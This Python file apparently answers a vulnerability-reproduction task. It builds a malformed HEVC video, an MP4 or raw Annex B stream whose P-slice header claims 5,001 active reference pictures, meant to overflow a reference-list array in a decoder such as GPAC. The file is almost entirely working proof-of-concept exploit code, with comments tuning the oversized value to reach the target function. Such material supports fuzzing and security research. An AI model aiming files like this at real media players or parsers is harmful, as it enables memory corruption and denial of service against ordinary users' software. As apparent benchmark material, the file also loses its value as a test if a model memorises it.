import io
import os
import re
import struct
import tarfile
from typing import List, Optional


def _u8(x: int) -> bytes:
    return struct.pack(">B", x & 0xFF)


def _u16(x: int) -> bytes:
    return struct.pack(">H", x & 0xFFFF)


def _u32(x: int) -> bytes:
    return struct.pack(">I", x & 0xFFFFFFFF)


def _s32(x: int) -> bytes:
    return struct.pack(">i", x)


def _box(typ: bytes, payload: bytes) -> bytes:
    if len(typ) != 4:
        raise ValueError("box type must be 4 bytes")
    size = 8 + len(payload)
    return _u32(size) + typ + payload


def _fullbox(typ: bytes, version: int, flags: int, payload: bytes) -> bytes:
    vf = ((version & 0xFF) << 24) | (flags & 0xFFFFFF)
    return _box(typ, _u32(vf) + payload)


class _BitWriter:
    __slots__ = ("_buf", "_cur", "_nbits")

    def __init__(self) -> None:
        self._buf = bytearray()
        self._cur = 0
        self._nbits = 0

    def write_bit(self, b: int) -> None:
        self._cur = (self._cur << 1) | (1 if b else 0)
        self._nbits += 1
        if self._nbits == 8:
            self._buf.append(self._cur & 0xFF)
            self._cur = 0
            self._nbits = 0

    def write_bits(self, v: int, n: int) -> None:
        for i in range(n - 1, -1, -1):
            self.write_bit((v >> i) & 1)

    def write_ue(self, v: int) -> None:
        if v < 0:
            raise ValueError("ue must be non-negative")
        code_num = v + 1
        l = code_num.bit_length() - 1
        for _ in range(l):
            self.write_bit(0)
        self.write_bit(1)
        if l:
            self.write_bits(code_num - (1 << l), l)

    def write_se(self, v: int) -> None:
        if v == 0:
            self.write_ue(0)
        elif v > 0:
            self.write_ue(2 * v - 1)
        else:
            self.write_ue(-2 * v)

    def rbsp_trailing_bits(self) -> None:
        self.write_bit(1)
        while self._nbits != 0:
            self.write_bit(0)

    def get_bytes(self) -> bytes:
        if self._nbits != 0:
            self._buf.append((self._cur << (8 - self._nbits)) & 0xFF)
            self._cur = 0
            self._nbits = 0
        return bytes(self._buf)


def _rbsp_to_ebsp(rbsp: bytes) -> bytes:
    out = bytearray()
    zcount = 0
    for b in rbsp:
        if zcount >= 2 and b <= 3:
            out.append(0x03)
            zcount = 0
        out.append(b)
        if b == 0:
            zcount += 1
        else:
            zcount = 0
    return bytes(out)


def _hevc_nal_header(nal_unit_type: int, nuh_layer_id: int = 0, tid_plus1: int = 1) -> bytes:
    hdr = ((nal_unit_type & 0x3F) << 9) | ((nuh_layer_id & 0x3F) << 3) | (tid_plus1 & 0x07)
    return struct.pack(">H", hdr)


def _profile_tier_level(w: _BitWriter, max_sub_layers_minus1: int) -> None:
    w.write_bits(0, 2)  # general_profile_space
    w.write_bits(0, 1)  # general_tier_flag
    w.write_bits(1, 5)  # general_profile_idc (Main)
    w.write_bits(0x40000000, 32)  # general_profile_compatibility_flags
    w.write_bits(0, 48)  # general_constraint_indicator_flags
    w.write_bits(120, 8)  # general_level_idc (4.0)

    for _ in range(max_sub_layers_minus1):
        w.write_bit(0)  # sub_layer_profile_present_flag
        w.write_bit(0)  # sub_layer_level_present_flag

    if max_sub_layers_minus1 > 0:
        for _ in range(8 - max_sub_layers_minus1):
            w.write_bits(0, 2)  # reserved_zero_2bits

    for _ in range(max_sub_layers_minus1):
        # no profile/level since flags were 0
        pass


def _build_vps() -> bytes:
    w = _BitWriter()
    w.write_bits(0, 4)  # vps_video_parameter_set_id
    w.write_bits(1, 1)  # vps_base_layer_internal_flag
    w.write_bits(1, 1)  # vps_base_layer_available_flag
    w.write_bits(0, 6)  # vps_max_layers_minus1
    w.write_bits(0, 3)  # vps_max_sub_layers_minus1
    w.write_bits(1, 1)  # vps_temporal_id_nesting_flag
    w.write_bits(0xFFFF, 16)  # vps_reserved_0xffff_16bits
    _profile_tier_level(w, 0)
    w.write_bit(0)  # vps_sub_layer_ordering_info_present_flag
    w.write_ue(0)  # vps_max_dec_pic_buffering_minus1[0]
    w.write_ue(0)  # vps_max_num_reorder_pics[0]
    w.write_ue(0)  # vps_max_latency_increase_plus1[0]
    w.write_bits(0, 6)  # vps_max_layer_id
    w.write_ue(0)  # vps_num_layer_sets_minus1
    w.write_bit(0)  # vps_timing_info_present_flag
    w.write_bit(0)  # vps_extension_flag
    w.rbsp_trailing_bits()
    rbsp = w.get_bytes()
    ebsp = _rbsp_to_ebsp(rbsp)
    return _hevc_nal_header(32) + ebsp  # VPS_NUT


def _build_sps(num_negative_pics: int = 1) -> bytes:
    w = _BitWriter()
    w.write_bits(0, 4)  # sps_video_parameter_set_id
    w.write_bits(0, 3)  # sps_max_sub_layers_minus1
    w.write_bits(1, 1)  # sps_temporal_id_nesting_flag
    _profile_tier_level(w, 0)
    w.write_ue(0)  # sps_seq_parameter_set_id
    w.write_ue(1)  # chroma_format_idc (4:2:0)
    w.write_ue(64)  # pic_width_in_luma_samples
    w.write_ue(64)  # pic_height_in_luma_samples
    w.write_bit(0)  # conformance_window_flag
    w.write_ue(0)  # bit_depth_luma_minus8
    w.write_ue(0)  # bit_depth_chroma_minus8
    w.write_ue(4)  # log2_max_pic_order_cnt_lsb_minus4 (=> 8 bits)
    w.write_bit(0)  # sps_sub_layer_ordering_info_present_flag
    w.write_ue(0)  # sps_max_dec_pic_buffering_minus1[0]
    w.write_ue(0)  # sps_max_num_reorder_pics[0]
    w.write_ue(0)  # sps_max_latency_increase_plus1[0]
    w.write_ue(0)  # log2_min_luma_coding_block_size_minus3
    w.write_ue(0)  # log2_diff_max_min_luma_coding_block_size
    w.write_ue(0)  # log2_min_luma_transform_block_size_minus2
    w.write_ue(0)  # log2_diff_max_min_luma_transform_block_size
    w.write_ue(0)  # max_transform_hierarchy_depth_inter
    w.write_ue(0)  # max_transform_hierarchy_depth_intra
    w.write_bit(0)  # scaling_list_enabled_flag
    w.write_bit(0)  # amp_enabled_flag
    w.write_bit(0)  # sample_adaptive_offset_enabled_flag
    w.write_bit(0)  # pcm_enabled_flag

    w.write_ue(1)  # num_short_term_ref_pic_sets
    # st_ref_pic_set(0)
    if num_negative_pics < 1:
        num_negative_pics = 1
    w.write_ue(num_negative_pics)  # num_negative_pics
    w.write_ue(0)  # num_positive_pics
    for _ in range(num_negative_pics):
        w.write_ue(0)  # delta_poc_s0_minus1 (=> -1 each)
        w.write_bit(1)  # used_by_curr_pic_s0_flag

    w.write_bit(0)  # long_term_ref_pics_present_flag
    w.write_bit(0)  # sps_temporal_mvp_enabled_flag
    w.write_bit(0)  # strong_intra_smoothing_enabled_flag
    w.write_bit(0)  # vui_parameters_present_flag
    w.write_bit(0)  # sps_extension_present_flag

    w.rbsp_trailing_bits()
    rbsp = w.get_bytes()
    ebsp = _rbsp_to_ebsp(rbsp)
    return _hevc_nal_header(33) + ebsp  # SPS_NUT


def _build_pps() -> bytes:
    w = _BitWriter()
    w.write_ue(0)  # pps_pic_parameter_set_id
    w.write_ue(0)  # pps_seq_parameter_set_id
    w.write_bit(0)  # dependent_slice_segments_enabled_flag
    w.write_bit(0)  # output_flag_present_flag
    w.write_bits(0, 3)  # num_extra_slice_header_bits
    w.write_bit(0)  # sign_data_hiding_enabled_flag
    w.write_bit(0)  # cabac_init_present_flag
    w.write_ue(0)  # num_ref_idx_l0_default_active_minus1
    w.write_ue(0)  # num_ref_idx_l1_default_active_minus1
    w.write_se(0)  # init_qp_minus26
    w.write_bit(0)  # constrained_intra_pred_flag
    w.write_bit(0)  # transform_skip_enabled_flag
    w.write_bit(0)  # cu_qp_delta_enabled_flag
    w.write_se(0)  # pps_cb_qp_offset
    w.write_se(0)  # pps_cr_qp_offset
    w.write_bit(0)  # pps_slice_chroma_qp_offsets_present_flag
    w.write_bit(0)  # weighted_pred_flag
    w.write_bit(0)  # weighted_bipred_flag
    w.write_bit(0)  # transquant_bypass_enabled_flag
    w.write_bit(0)  # tiles_enabled_flag
    w.write_bit(0)  # entropy_coding_sync_enabled_flag
    w.write_bit(0)  # pps_loop_filter_across_slices_enabled_flag
    w.write_bit(0)  # deblocking_filter_control_present_flag
    w.write_bit(0)  # pps_scaling_list_data_present_flag
    w.write_bit(0)  # lists_modification_present_flag
    w.write_ue(0)  # log2_parallel_merge_level_minus2
    w.write_bit(0)  # slice_segment_header_extension_present_flag
    w.write_bit(0)  # pps_extension_present_flag
    w.rbsp_trailing_bits()
    rbsp = w.get_bytes()
    ebsp = _rbsp_to_ebsp(rbsp)
    return _hevc_nal_header(34) + ebsp  # PPS_NUT


def _build_slice(num_ref_idx_l0_active_minus1: int = 5000) -> bytes:
    # Non-IDR slice (TRAIL_R) with P slice type
    w = _BitWriter()
    w.write_bit(1)  # first_slice_segment_in_pic_flag
    w.write_ue(0)  # slice_pic_parameter_set_id
    w.write_ue(1)  # slice_type (P)
    w.write_bits(0, 8)  # slice_pic_order_cnt_lsb
    w.write_bit(1)  # short_term_ref_pic_set_sps_flag
    w.write_ue(0)  # short_term_ref_pic_set_idx

    w.write_bit(1)  # num_ref_idx_active_override_flag
    if num_ref_idx_l0_active_minus1 < 0:
        num_ref_idx_l0_active_minus1 = 0
    w.write_ue(num_ref_idx_l0_active_minus1)  # num_ref_idx_l0_active_minus1 (oversized)

    w.write_ue(0)  # five_minus_max_num_merge_cand
    w.write_se(0)  # slice_qp_delta

    w.rbsp_trailing_bits()
    rbsp = w.get_bytes()
    ebsp = _rbsp_to_ebsp(rbsp)
    return _hevc_nal_header(1) + ebsp  # TRAIL_R


def _build_hvcc(vps: bytes, sps: bytes, pps: bytes) -> bytes:
    # vps/sps/pps here are full NAL units (2-byte header + EBSP). hvcC stores NAL units as-is (no start codes).
    configuration_version = 1
    general_profile_space = 0
    general_tier_flag = 0
    general_profile_idc = 1
    general_profile_compatibility_flags = 0x40000000
    general_constraint_indicator_flags = 0
    general_level_idc = 120

    min_spatial_segmentation_idc = 0
    parallelism_type = 0
    chroma_format = 1
    bit_depth_luma_minus8 = 0
    bit_depth_chroma_minus8 = 0
    avg_frame_rate = 0
    constant_frame_rate = 0
    num_temporal_layers = 1
    temporal_id_nested = 1
    length_size_minus_one = 3  # 4 bytes

    out = bytearray()
    out += _u8(configuration_version)
    out += _u8(((general_profile_space & 3) << 6) | ((general_tier_flag & 1) << 5) | (general_profile_idc & 0x1F))
    out += _u32(general_profile_compatibility_flags)
    out += general_constraint_indicator_flags.to_bytes(6, "big")
    out += _u8(general_level_idc)

    out += _u16(0xF000 | (min_spatial_segmentation_idc & 0x0FFF))
    out += _u8(0xFC | (parallelism_type & 0x03))
    out += _u8(0xFC | (chroma_format & 0x03))
    out += _u8(0xF8 | (bit_depth_luma_minus8 & 0x07))
    out += _u8(0xF8 | (bit_depth_chroma_minus8 & 0x07))
    out += _u16(avg_frame_rate)

    out += _u8(((constant_frame_rate & 3) << 6) | ((num_temporal_layers & 7) << 3) | ((temporal_id_nested & 1) << 2) | (length_size_minus_one & 3))

    arrays = [(32, vps), (33, sps), (34, pps)]
    out += _u8(len(arrays))

    for nal_type, nal in arrays:
        out += _u8(0x80 | (nal_type & 0x3F))  # array_completeness=1, reserved=0
        out += _u16(1)  # numNalus
        out += _u16(len(nal))
        out += nal

    return bytes(out)


def _make_mp4(nals: List[bytes]) -> bytes:
    sample = b"".join(_u32(len(n)) + n for n in nals)
    sample_size = len(sample)

    vps, sps, pps = nals[0], nals[1], nals[2]
    hvcc_payload = _build_hvcc(vps, sps, pps)
    hvcc_box = _box(b"hvcC", hvcc_payload)

    width = 64
    height = 64

    # VisualSampleEntry (hvc1)
    vse = bytearray()
    vse += b"\x00" * 6  # reserved
    vse += _u16(1)  # data_reference_index
    vse += _u16(0)  # pre_defined
    vse += _u16(0)  # reserved
    vse += b"\x00" * 12  # pre_defined[3]
    vse += _u16(width)
    vse += _u16(height)
    vse += _u32(0x00480000)  # horizresolution 72 dpi
    vse += _u32(0x00480000)  # vertresolution
    vse += _u32(0)  # reserved
    vse += _u16(1)  # frame_count
    vse += b"\x00" + (b"\x00" * 31)  # compressorname
    vse += _u16(0x0018)  # depth
    vse += _u16(0xFFFF)  # pre_defined
    vse += hvcc_box
    hvc1 = _box(b"hvc1", bytes(vse))

    stsd = _fullbox(b"stsd", 0, 0, _u32(1) + hvc1)
    stts = _fullbox(b"stts", 0, 0, _u32(1) + _u32(1) + _u32(1000))
    stsc = _fullbox(b"stsc", 0, 0, _u32(1) + _u32(1) + _u32(1) + _u32(1))
    stsz = _fullbox(b"stsz", 0, 0, _u32(0) + _u32(1) + _u32(sample_size))
    stco = _fullbox(b"stco", 0, 0, _u32(1) + _u32(0))  # patched later
    stss = _fullbox(b"stss", 0, 0, _u32(1) + _u32(1))

    stbl = _box(b"stbl", stsd + stts + stsc + stsz + stss + stco)

    url = _fullbox(b"url ", 0, 1, b"")
    dref = _fullbox(b"dref", 0, 0, _u32(1) + url)
    dinf = _box(b"dinf", dref)

    vmhd = _fullbox(b"vmhd", 0, 1, _u16(0) + _u16(0) + _u16(0) + _u16(0))
    minf = _box(b"minf", vmhd + dinf + stbl)

    mdhd = _fullbox(b"mdhd", 0, 0, _u32(0) + _u32(0) + _u32(1000) + _u32(1000) + _u16(0x55C4) + _u16(0))
    hdlr = _fullbox(b"hdlr", 0, 0, _u32(0) + b"vide" + (b"\x00" * 12) + b"VideoHandler\x00")
    mdia = _box(b"mdia", mdhd + hdlr + minf)

    matrix = (
        _u32(0x00010000) + _u32(0) + _u32(0) +
        _u32(0) + _u32(0x00010000) + _u32(0) +
        _u32(0) + _u32(0) + _u32(0x40000000)
    )

    tkhd = _fullbox(
        b"tkhd", 0, 0x000007,
        _u32(0) + _u32(0) + _u32(1) + _u32(0) + _u32(1000) +
        _u32(0) + _u32(0) +
        _u16(0) + _u16(0) +
        _u16(0) + _u16(0) +
        matrix +
        _u32(width << 16) + _u32(height << 16)
    )

    trak = _box(b"trak", tkhd + mdia)

    mvhd = _fullbox(
        b"mvhd", 0, 0,
        _u32(0) + _u32(0) + _u32(1000) + _u32(1000) +
        _u32(0x00010000) + _u16(0x0100) + _u16(0) +
        _u32(0) + _u32(0) +
        matrix +
        (b"\x00" * 24) +
        _u32(2)
    )

    moov_0 = _box(b"moov", mvhd + trak)
    ftyp = _box(b"ftyp", b"isom" + _u32(0) + b"isom" + b"iso2" + b"mp41")
    mdat = _box(b"mdat", sample)

    # patch stco offset by rebuilding moov with correct chunk offset
    # file layout: ftyp + moov + mdat
    # chunk_offset points to start of mdat payload (header 8 bytes)
    chunk_offset = len(ftyp) + len(moov_0) + 8

    stco_patched = _fullbox(b"stco", 0, 0, _u32(1) + _u32(chunk_offset))
    stbl_patched = _box(b"stbl", stsd + stts + stsc + stsz + stss + stco_patched)
    minf_patched = _box(b"minf", vmhd + dinf + stbl_patched)
    mdia_patched = _box(b"mdia", mdhd + hdlr + minf_patched)
    trak_patched = _box(b"trak", tkhd + mdia_patched)
    moov = _box(b"moov", mvhd + trak_patched)

    # recompute chunk offset after moov rebuilt (size unchanged, but safe to recalc)
    chunk_offset = len(ftyp) + len(moov) + 8
    if chunk_offset != struct.unpack(">I", stco_patched[-4:])[0]:
        stco_patched2 = _fullbox(b"stco", 0, 0, _u32(1) + _u32(chunk_offset))
        stbl_patched2 = _box(b"stbl", stsd + stts + stsc + stsz + stss + stco_patched2)
        minf_patched2 = _box(b"minf", vmhd + dinf + stbl_patched2)
        mdia_patched2 = _box(b"mdia", mdhd + hdlr + minf_patched2)
        trak_patched2 = _box(b"trak", tkhd + mdia_patched2)
        moov = _box(b"moov", mvhd + trak_patched2)

    return ftyp + moov + mdat


def _make_annexb(nals: List[bytes]) -> bytes:
    start = b"\x00\x00\x00\x01"
    return b"".join(start + n for n in nals)


def _detect_expected_format(src_path: str) -> str:
    # Heuristic: if fuzzer/harness mentions gf_isom_open/isom, likely expects MP4.
    # If it mentions hevc and start codes/AnnexB/NAL parsing, likely expects raw HEVC.
    try:
        with tarfile.open(src_path, "r:*") as tf:
            members = tf.getmembers()
            for m in members:
                if not m.isfile():
                    continue
                n = m.name.lower()
                if not (("fuzz" in n) or ("oss-fuzz" in n) or ("fuzzer" in n)):
                    continue
                if not n.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp")):
                    continue
                if m.size <= 0 or m.size > 1_000_000:
                    continue
                f = tf.extractfile(m)
                if not f:
                    continue
                data = f.read(200_000)
                s = data.decode("latin1", "ignore").lower()
                if "llvmfuzzertestoneinput" not in s and "afl" not in s and "honggfuzz" not in s:
                    continue
                if "gf_isom_open" in s or "gf_isom" in s or "isom_open" in s or "isom" in s and "mp4" in s:
                    return "mp4"
                if ("hevc" in s or "h265" in s) and ("annexb" in s or "start code" in s or "nalu" in s or "nal unit" in s):
                    return "hevc"
    except Exception:
        pass
    return "mp4"


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Use moderate oversized ref list length; large enough to exceed any plausible stack array,
        # but small enough to avoid pathological parsing limits.
        num_ref_idx_l0_active_minus1 = 5000

        # Keep RPS small to avoid triggering other issues outside the target function.
        # (If needed, could be increased, but this tends to be sufficient for ref list overflows.)
        vps = _build_vps()
        sps = _build_sps(num_negative_pics=1)
        pps = _build_pps()
        slc = _build_slice(num_ref_idx_l0_active_minus1=num_ref_idx_l0_active_minus1)

        nals = [vps, sps, pps, slc]

        fmt = _detect_expected_format(src_path) if src_path else "mp4"
        if fmt == "hevc":
            return _make_annexb(nals)
        return _make_mp4(nals)